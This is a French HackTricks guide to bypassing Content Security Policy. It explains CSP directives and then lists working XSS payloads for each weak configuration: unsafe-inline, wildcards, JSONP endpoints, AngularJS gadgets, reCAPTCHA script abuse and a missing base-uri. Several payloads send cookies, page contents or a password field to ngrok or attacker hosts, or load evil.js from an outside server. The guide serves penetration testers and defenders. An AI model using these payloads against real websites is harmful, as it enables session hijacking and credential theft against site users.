# Contournement de la politique de s√©curit√© du contenu (CSP)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage en √©volution rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs pirates d√®s aujourd'hui !

## Qu'est-ce que CSP

La politique de s√©curit√© du contenu (CSP) est reconnue comme une technologie de navigateur, principalement destin√©e √† **prot√©ger contre des attaques telles que le script intersite (XSS)**. Elle fonctionne en d√©finissant et en d√©taillant les chemins et les sources √† partir desquels les ressources peuvent √™tre charg√©es en toute s√©curit√© par le navigateur. Ces ressources comprennent une gamme d'√©l√©ments tels que des images, des cadres et du JavaScript. Par exemple, une politique peut autoriser le chargement et l'ex√©cution de ressources √† partir du m√™me domaine (self), y compris des ressources int√©gr√©es et l'ex√©cution de code de cha√Æne via des fonctions telles que `eval`, `setTimeout` ou `setInterval`.

La mise en ≈ìuvre de la CSP est r√©alis√©e via des **en-t√™tes de r√©ponse** ou en incorporant des **√©l√©ments meta dans la page HTML**. En suivant cette politique, les navigateurs appliquent proactivement ces stipulations et bloquent imm√©diatement toute violation d√©tect√©e.

* Impl√©ment√© via l'en-t√™te de r√©ponse:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Mis en ≈ìuvre via balise meta :
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### En-t√™tes

CSP peut √™tre appliqu√© ou surveill√© en utilisant ces en-t√™tes :

* `Content-Security-Policy` : Applique le CSP ; le navigateur bloque toute violation.
* `Content-Security-Policy-Report-Only` : Utilis√© pour la surveillance ; signale les violations sans les bloquer. Id√©al pour les tests dans des environnements de pr√©-production.

### D√©finition des ressources

CSP restreint les origines pour le chargement de contenu actif et passif, contr√¥lant des aspects tels que l'ex√©cution de JavaScript en ligne et l'utilisation de `eval()`. Un exemple de politique est :
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

* **script-src**: Autorise des sources sp√©cifiques pour JavaScript, y compris des URL, des scripts en ligne, et des scripts d√©clench√©s par des gestionnaires d'√©v√©nements ou des feuilles de style XSLT.
* **default-src**: D√©finit une politique par d√©faut pour r√©cup√©rer des ressources lorsque des directives de r√©cup√©ration sp√©cifiques sont absentes.
* **child-src**: Sp√©cifie les ressources autoris√©es pour les travailleurs web et le contenu des cadres int√©gr√©s.
* **connect-src**: Restreint les URL qui peuvent √™tre charg√©es en utilisant des interfaces comme fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Restreint les URL pour les cadres.
* **frame-ancestors**: Sp√©cifie quelles sources peuvent int√©grer la page actuelle, applicable aux √©l√©ments tels que `<frame>`, `<iframe>`, `<object>`, `<embed>`, et `<applet>`.
* **img-src**: D√©finit les sources autoris√©es pour les images.
* **font-src**: Sp√©cifie les sources valides pour les polices charg√©es en utilisant `@font-face`.
* **manifest-src**: D√©finit les sources autoris√©es des fichiers de manifeste d'application.
* **media-src**: D√©finit les sources autoris√©es pour le chargement d'objets multim√©dias.
* **object-src**: D√©finit les sources autoris√©es pour les √©l√©ments `<object>`, `<embed>`, et `<applet>`.
* **base-uri**: Sp√©cifie les URL autoris√©es pour le chargement en utilisant les √©l√©ments `<base>`.
* **form-action**: Liste les points de terminaison valides pour les soumissions de formulaire.
* **plugin-types**: Restreint les types MIME qu'une page peut invoquer.
* **upgrade-insecure-requests**: Indique aux navigateurs de r√©√©crire les URL HTTP en HTTPS.
* **sandbox**: Applique des restrictions similaires √† l'attribut sandbox d'un `<iframe>`.
* **report-to**: Sp√©cifie un groupe auquel un rapport sera envoy√© si la politique est viol√©e.
* **worker-src**: Sp√©cifie les sources valides pour les scripts Worker, SharedWorker, ou ServiceWorker.
* **prefetch-src**: Sp√©cifie les sources valides pour les ressources qui seront r√©cup√©r√©es ou pr√©charg√©es.
* **navigate-to**: Restreint les URL vers lesquelles un document peut naviguer par tous les moyens (a, form, window.location, window.open, etc.)

### Sources

* `*`: Autorise toutes les URL sauf celles avec les sch√©mas `data:`, `blob:`, `filesystem:`.
* `'self'`: Autorise le chargement depuis le m√™me domaine.
* `'data'`: Autorise le chargement de ressources via le sch√©ma data (par exemple, images encod√©es en Base64).
* `'none'`: Bloque le chargement depuis n'importe quelle source.
* `'unsafe-eval'`: Autorise l'utilisation de `eval()` et des m√©thodes similaires, non recommand√© pour des raisons de s√©curit√©.
* `'unsafe-hashes'`: Active des gestionnaires d'√©v√©nements en ligne sp√©cifiques.
* `'unsafe-inline'`: Autorise l'utilisation de ressources en ligne comme les `<script>` ou `<style>` en ligne, non recommand√© pour des raisons de s√©curit√©.
* `'nonce'`: Une liste blanche pour des scripts en ligne sp√©cifiques en utilisant un nonce cryptographique (nombre utilis√© une fois).
* Si vous avez une ex√©cution JS limit√©e, il est possible d'obtenir un nonce utilis√© √† l'int√©rieur de la page avec `doc.defaultView.top.document.querySelector("[nonce]")` et ensuite de le r√©utiliser pour charger un script malveillant (si strict-dynamic est utilis√©, toute source autoris√©e peut charger de nouvelles sources donc ce n'est pas n√©cessaire), comme dans :

<details>

<summary>Charger un script en r√©utilisant le nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: Liste blanche des scripts avec un hachage sha256 sp√©cifique.
* `'strict-dynamic'`: Autorise le chargement de scripts depuis n'importe quelle source s'ils ont √©t√© list√©s en tant que nonce ou hachage.
* `'host'`: Sp√©cifie un h√¥te sp√©cifique, comme `example.com`.
* `https:`: Restreint les URL √† celles qui utilisent HTTPS.
* `blob:`: Autorise le chargement de ressources √† partir d'URL Blob (par exemple, des URL Blob cr√©√©es via JavaScript).
* `filesystem:`: Autorise le chargement de ressources √† partir du syst√®me de fichiers.
* `'report-sample'`: Inclut un √©chantillon du code en violation dans le rapport de violation (utile pour le d√©bogage).
* `'strict-origin'`: Similaire √† 'self' mais garantit que le niveau de s√©curit√© du protocole des sources correspond au document (seules les origines s√©curis√©es peuvent charger des ressources √† partir d'origines s√©curis√©es).
* `'strict-origin-when-cross-origin'`: Envoie des URL compl√®tes lors de la r√©alisation de requ√™tes de m√™me origine, mais envoie uniquement l'origine lorsque la requ√™te est cross-origin.
* `'unsafe-allow-redirects'`: Autorise le chargement de ressources qui redirigeront imm√©diatement vers une autre ressource. Non recommand√© car cela affaiblit la s√©curit√©.

## R√®gles CSP non s√©curis√©es

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Working payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
Cela ne fonctionne pas, pour plus d'informations [**consultez ceci**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Charge de travail fonctionnelle :
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si vous pouvez d'une mani√®re ou d'une autre faire en sorte qu'un **code JS autoris√© cr√©e une nouvelle balise script** dans le DOM avec votre code JS, car un script autoris√© le cr√©e, la **nouvelle balise script pourra √™tre ex√©cut√©e**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Charge de travail fonctionnelle :
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Manque de object-src et default-src

{% hint style="danger" %}
**Il semble que cela ne fonctionne plus**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Payloads de travail :
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### T√©l√©chargement de fichiers + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si vous pouvez t√©l√©charger un fichier JS, vous pouvez contourner ce CSP :

Charge de travail fonctionnelle :
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Cependant, il est tr√®s probable que le serveur **valide le fichier t√©l√©charg√©** et ne vous permettra d'**uploader que des types de fichiers sp√©cifiques**.

De plus, m√™me si vous pouviez t√©l√©charger un **code JS √† l'int√©rieur** d'un fichier en utilisant une extension accept√©e par le serveur (comme : _script.png_), cela ne suffirait pas car certains serveurs comme le serveur apache **s√©lectionnent le type MIME du fichier en fonction de l'extension** et les navigateurs comme Chrome **refuseront d'ex√©cuter du code Javascript** √† l'int√©rieur de ce qui devrait √™tre une image. "Heureusement", il y a des erreurs. Par exemple, d'un CTF, j'ai appris qu'**Apache ne reconna√Æt pas** l'extension _**.wave**_, donc il ne la sert pas avec un **type MIME comme audio/\***.

√Ä partir de l√†, si vous trouvez une XSS et un t√©l√©chargement de fichier, et que vous parvenez √† trouver une **extension mal interpr√©t√©e**, vous pourriez essayer de t√©l√©charger un fichier avec cette extension et le contenu du script. Ou, si le serveur v√©rifie le format correct du fichier t√©l√©charg√©, cr√©ez un polyglotte ([quelques exemples de polyglottes ici](https://github.com/Polydet/polyglot-database)).

### Form-action

S'il n'est pas possible d'injecter du JS, vous pourriez toujours essayer d'exfiltrer par exemple des informations d'identification en **injectant une action de formulaire** (et peut-√™tre en esp√©rant que les gestionnaires de mots de passe remplissent automatiquement les mots de passe). Vous pouvez trouver un [**exemple dans ce rapport**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). De plus, notez que `default-src` ne couvre pas les actions de formulaire.

### Points d'extr√©mit√© tiers + ('unsafe-eval')

{% hint style="warning" %}
Pour certains des payloads suivants, **`unsafe-eval` n'est m√™me pas n√©cessaire**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Chargez une version vuln√©rable d'angular et ex√©cutez du JS arbitraire :
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads utilisant Angular + une biblioth√®que avec des fonctions qui renvoient l'objet `window` ([consultez cet article](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
L'article montre que vous pourriez **charger** toutes les **biblioth√®ques** depuis `cdn.cloudflare.com` (ou tout autre r√©f√©rentiel de biblioth√®ques JS autoris√©), ex√©cuter toutes les fonctions ajout√©es de chaque biblioth√®que, et v√©rifier **quelles fonctions de quelles biblioth√®ques renvoient l'objet `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
### Contournement de la strat√©gie de s√©curit√© du contenu (CSP) pour Angular XSS √† partir d'un nom de classe :
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Abus du code JS de Google reCAPTCHA

Selon [**ce compte rendu de CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), vous pouvez abuser de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) √† l'int√©rieur d'une CSP pour ex√©cuter du code JS arbitraire en contournant la CSP :
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Plus de [**payloads de cet article**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Abus de www.google.com pour une redirection ouverte

L'URL suivante redirige vers example.com (√† partir de [ici](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
### Points de terminaison tiers + JSONP

Il est possible d'abuser de Google Apps Script pour recevoir des informations dans une page √† l'int√©rieur de script.google.com. Comme c'est [fait dans ce rapport](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Les sc√©narios comme celui-ci o√π `script-src` est d√©fini sur `self` et un domaine particulier qui est autoris√© peuvent √™tre contourn√©s en utilisant JSONP. Les points de terminaison JSONP permettent des m√©thodes de rappel non s√©curis√©es qui permettent √† un attaquant d'ex√©cuter une XSS, charge utile de travail:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contient des points de terminaison JSONP pr√™ts √† l'emploi pour contourner la CSP de diff√©rents sites web.**

La m√™me vuln√©rabilit√© se produira si le **point de terminaison de confiance contient une redirection ouverte** car si le point de terminaison initial est de confiance, les redirections sont de confiance.

### Abus de tiers

Comme d√©crit dans le [post suivant](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), il existe de nombreux domaines tiers, qui pourraient √™tre autoris√©s quelque part dans la CSP, peuvent √™tre utilis√©s pour soit exfiltrer des donn√©es soit ex√©cuter du code JavaScript. Certains de ces tiers sont :

| Entit√©            | Domaine Autoris√©                             | Capacit√©s    |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Si vous trouvez l'un des domaines autoris√©s dans la CSP de votre cible, il est probable que vous puissiez contourner la CSP en vous inscrivant sur le service tiers et, soit exfiltrer des donn√©es vers ce service, soit ex√©cuter du code.

Par exemple, si vous trouvez la CSP suivante :
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
# Contournement de la politique de s√©curit√© du contenu (CSP)

---

La politique de s√©curit√© du contenu (CSP) est un m√©canisme de s√©curit√© important pour prot√©ger les applications web contre les attaques XSS et d'autres types d'attaques. Cependant, il est parfois possible de contourner la CSP en exploitant des vuln√©rabilit√©s sp√©cifiques dans l'application web.

Dans ce guide, nous explorerons diff√©rentes techniques de contournement de la CSP qui peuvent √™tre utilis√©es par les attaquants pour ex√©cuter du code malveillant sur des sites web prot√©g√©s par CSP. Ces techniques incluent l'utilisation de directives CSP mal configur√©es, l'exploitation de vuln√©rabilit√©s de script intersite (XSS) et d'autres m√©thodes cr√©atives pour contourner les restrictions impos√©es par la CSP.

Il est essentiel pour les d√©veloppeurs web et les testeurs de p√©n√©tration de comprendre ces techniques de contournement de la CSP afin de renforcer la s√©curit√© de leurs applications web et de mieux se prot√©ger contre les attaques potentielles.
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Vous devriez √™tre capable d'exfiltrer des donn√©es, de la m√™me mani√®re que cela a toujours √©t√© fait avec [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Dans ce cas, suivez ces √©tapes g√©n√©rales :

1. Cr√©ez un compte d√©veloppeur Facebook ici.
2. Cr√©ez une nouvelle application "Facebook Login" et s√©lectionnez "Site web".
3. Allez dans "Param√®tres -> G√©n√©ral" et obtenez votre "ID d'application".
4. Sur le site cible dont vous souhaitez exfiltrer des donn√©es, vous pouvez le faire directement en utilisant le gadget SDK Facebook "fbq" via un "customEvent" et la charge utile de donn√©es.
5. Allez dans le "Gestionnaire d'√©v√©nements" de votre application et s√©lectionnez l'application que vous avez cr√©√©e (notez que le gestionnaire d'√©v√©nements peut √™tre trouv√© dans une URL similaire √† ceci : https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. S√©lectionnez l'onglet "√âv√©nements de test" pour voir les √©v√©nements envoy√©s par "votre" site web.

Ensuite, du c√¥t√© de la victime, ex√©cutez le code suivant pour initialiser le pixel de suivi Facebook afin de pointer vers l'ID d'application de l'application du compte d√©veloppeur Facebook de l'attaquant et √©mettre un √©v√©nement personnalis√© comme ceci :
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
### Contournement via RPO (√âcrasement de Chemin Relatif) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

En plus de la redirection mentionn√©e pour contourner les restrictions de chemin, il existe une autre technique appel√©e √âcrasement de Chemin Relatif (RPO) qui peut √™tre utilis√©e sur certains serveurs.

Par exemple, si CSP autorise le chemin `https://example.com/scripts/react/`, il peut √™tre contourn√© de la mani√®re suivante :
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Le navigateur chargera finalement `https://example.com/scripts/angular/angular.js`.

Cela fonctionne car pour le navigateur, vous chargez un fichier nomm√© `..%2fangular%2fangular.js` situ√© sous `https://example.com/scripts/react/`, ce qui est conforme √† la CSP.

Ainsi, il le d√©codera, demandant effectivement `https://example.com/scripts/react/../angular/angular.js`, ce qui est √©quivalent √† `https://example.com/scripts/angular/angular.js`.

En **exploitant cette incoh√©rence dans l'interpr√©tation des URL entre le navigateur et le serveur, les r√®gles de chemin peuvent √™tre contourn√©es**.

La solution consiste √† ne pas traiter `%2f` comme `/` c√¥t√© serveur, assurant une interpr√©tation coh√©rente entre le navigateur et le serveur pour √©viter ce probl√®me.

Exemple en ligne : [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Ex√©cution de JS dans les iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri** manquant

Si la directive **base-uri** est manquante, vous pouvez en abuser pour effectuer une [**injection de balisage en suspens**](../dangling-markup-html-scriptless-injection/).

De plus, si la **page charge un script en utilisant un chemin relatif** (comme `<script src="/js/app.js">`) en utilisant un **Nonce**, vous pouvez abuser de la balise **base** pour faire en sorte qu'elle **charge** le script depuis **votre propre serveur pour r√©aliser un XSS.**\
Si la page vuln√©rable est charg√©e avec **httpS**, utilisez une URL httpS dans la balise de base.
```html
<base href="https://www.attacker.com/">
```
### √âv√©nements AngularJS

Une politique sp√©cifique connue sous le nom de Content Security Policy (CSP) peut restreindre les √©v√©nements JavaScript. N√©anmoins, AngularJS introduit des √©v√©nements personnalis√©s comme alternative. Dans un √©v√©nement, AngularJS fournit un objet unique `$event`, faisant r√©f√©rence √† l'objet d'√©v√©nement natif du navigateur. Cet objet `$event` peut √™tre exploit√© pour contourner le CSP. Notamment, dans Chrome, l'objet `$event/event` poss√®de un attribut `path`, contenant un tableau d'objets impliqu√©s dans la cha√Æne d'ex√©cution de l'√©v√©nement, l'objet `window` √©tant invariablement positionn√© √† la fin. Cette structure est cruciale pour les tactiques d'√©vasion de bac √† sable.

En dirigeant ce tableau vers le filtre `orderBy`, il est possible de le parcourir, en exploitant l'√©l√©ment terminal (l'objet `window`) pour d√©clencher une fonction globale comme `alert()`. L'extrait de code ci-dessous illustre ce processus :
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ce extrait met en √©vidence l'utilisation de la directive `ng-focus` pour d√©clencher l'√©v√©nement, en utilisant `$event.path|orderBy` pour manipuler le tableau `path`, et en tirant parti de l'objet `window` pour ex√©cuter la fonction `alert()`, r√©v√©lant ainsi `document.cookie`.

**Trouvez d'autres contournements Angular sur** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS et domaine autoris√©
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Un CSP policy qui autorise les domaines pour le chargement de scripts dans une application Angular JS peut √™tre contourn√© en invoquant des fonctions de rappel et certaines classes vuln√©rables. Vous pouvez trouver plus d'informations sur cette technique dans un guide d√©taill√© disponible sur ce [d√©p√¥t git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Payloads fonctionnels:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Autres points d'ex√©cution arbitraire JSONP peuvent √™tre trouv√©s [**ici**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (certains d'entre eux ont √©t√© supprim√©s ou corrig√©s)

### Contournement via Redirection

Que se passe-t-il lorsque CSP rencontre une redirection c√¥t√© serveur ? Si la redirection m√®ne √† une origine diff√©rente qui n'est pas autoris√©e, elle √©chouera toujours.

Cependant, selon la description dans [la sp√©cification CSP 4.2.2.3. Chemins et Redirections](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), si la redirection m√®ne √† un chemin diff√©rent, elle peut contourner les restrictions initiales.

Voici un exemple :
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Si CSP est d√©fini sur `https://www.google.com/a/b/c/d`, puisque le chemin est pris en compte, les scripts `/test` et `/a/test` seront bloqu√©s par CSP.

Cependant, le lien final `http://localhost:5555/301` sera **redirig√© c√¥t√© serveur vers `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Comme il s'agit d'une redirection, le **chemin n'est pas pris en compte**, et le **script peut √™tre charg√©**, contournant ainsi la restriction du chemin.

Avec cette redirection, m√™me si le chemin est sp√©cifi√© compl√®tement, il sera quand m√™me contourn√©.

Par cons√©quent, la meilleure solution est de s'assurer que le site web ne pr√©sente aucune vuln√©rabilit√© de redirection ouverte et qu'il n'y a pas de domaines qui peuvent √™tre exploit√©s dans les r√®gles CSP.

### Contourner CSP avec un balisage suspendu

Lire [comment ici](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` signifie que vous pouvez ex√©cuter n'importe quel script dans le code (XSS peut ex√©cuter du code) et `img-src *` signifie que vous pouvez utiliser sur la page web n'importe quelle image provenant de n'importe quelle ressource.

Vous pouvez contourner ce CSP en exfiltrant les donn√©es via des images (dans ce cas, le XSS abuse d'un CSRF o√π une page accessible par le bot contient une injection SQL, et extrait le drapeau via une image):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
De : [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Vous pourriez √©galement abuser de cette configuration pour **charger du code JavaScript ins√©r√© √† l'int√©rieur d'une image**. Par exemple, si la page autorise le chargement d'images depuis Twitter. Vous pourriez **cr√©er** une **image sp√©ciale**, la **t√©l√©verser** sur Twitter et abuser de l'option "**unsafe-inline**" pour **ex√©cuter** un code JS (comme une XSS classique) qui va **charger** l'**image**, **extraire** le **JS** de celle-ci et **l'ex√©cuter** : [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Avec les Travailleurs de Service

La fonction **`importScripts`** des travailleurs de service n'est pas limit√©e par la CSP :

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Injection de Politique

